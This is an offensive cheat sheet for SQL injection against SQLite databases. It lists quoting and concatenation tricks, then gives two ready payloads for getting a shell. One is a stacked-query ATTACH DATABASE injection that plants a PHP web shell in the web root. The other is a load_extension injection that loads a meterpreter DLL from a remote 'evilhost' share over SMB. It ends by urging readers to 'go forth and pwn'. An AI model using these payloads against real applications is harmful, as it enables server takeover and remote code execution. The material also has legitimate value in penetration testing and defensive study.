# SQLite3 Injection Cheat Sheet

### &#x20;0x01 **Cheat Sheet**

|                                           |                                                                                |
| ----------------------------------------- | ------------------------------------------------------------------------------ |
| **Comments**                              | **--**                                                                         |
|  **IF Statements**                        |  **CASE**                                                                      |
|  **Concatenation**                        |  **\|\|**                                                                      |
|  **Substring**                            |  **substr(x,y,z)**                                                             |
|  **Length**                               |  **length(stuff)**                                                             |
|  **Generate single quote**                |  **select substr(quote(hex(0)),1,1);**                                         |
|  **Generate double quote**                |  **select cast(X'22' as text);**                                               |
|  **Generate double quote (method 2)**     |  **.. VALUES (“\<?xml version=“\|\|””””\|\|1\|\|**                             |
|  **Space-saving double quote generation** |  **select replace("\<?xml version=$1.0$>","$",(select cast(X'22' as text)));** |

### &#x20;**0x02 Getting Shell Trick 1 - ATTACH DATABASE**

requires stacked queries

```sql
?id=bob’; ATTACH DATABASE ‘/var/www/lol.php’ AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES (‘<? system($_GET[‘cmd’]); ?>’;--
```

### 0x03 **Getting Shell Trick 2 - SELECT load\_extension**

\
Takes two arguments:

* A library (.dll for Windows, .so for NIX)
* An entry point (SQLITE\_EXTENSION\_INIT1 by default)

This is great because&#x20;

1. This technique doesn't require stacked queries
2. The obvious - you can load a DLL right off the bat (meterpreter.dll? :)

\
Unfortunately, this component of SQLite is disabled in the libraries by default. SQLite devs saw the exploitability of this and turned it off. However, some custom libraries have it enabled - for example, one of the more popular Windows ODBC drivers. To make this even better, this particular injection works with UNC paths - so you can remotely load a nasty library over SMB (provided the target server can speak SMB to the Internets). Example:

```sql
?name=123 UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
```

### **Other neat bits**

\
If you have direct DB access, you can use **PRAGMA** commands to find out interesting information:

* **PRAGMA database\_list;** -- Shows info on the attached databases, including location on the FS. e.g. **0|main|/home/vt/haxing/sqlite/how.db**
* **PRAGMA temp\_store\_directory = '/filepath';** -- Supposedly sets directory for temp files, but deprecated. This would’ve been pretty sweet with the recent Android journal file permissions bug.

\
**Conclusion / Closing Remarks**\
SQLite is used in all sorts of crazy places, including Airbus, Adobe, Solaris, browsers, extensively on mobile platforms, etc. There is a lot of potential for further research in these areas (especially mobile) so go forth and pwn!
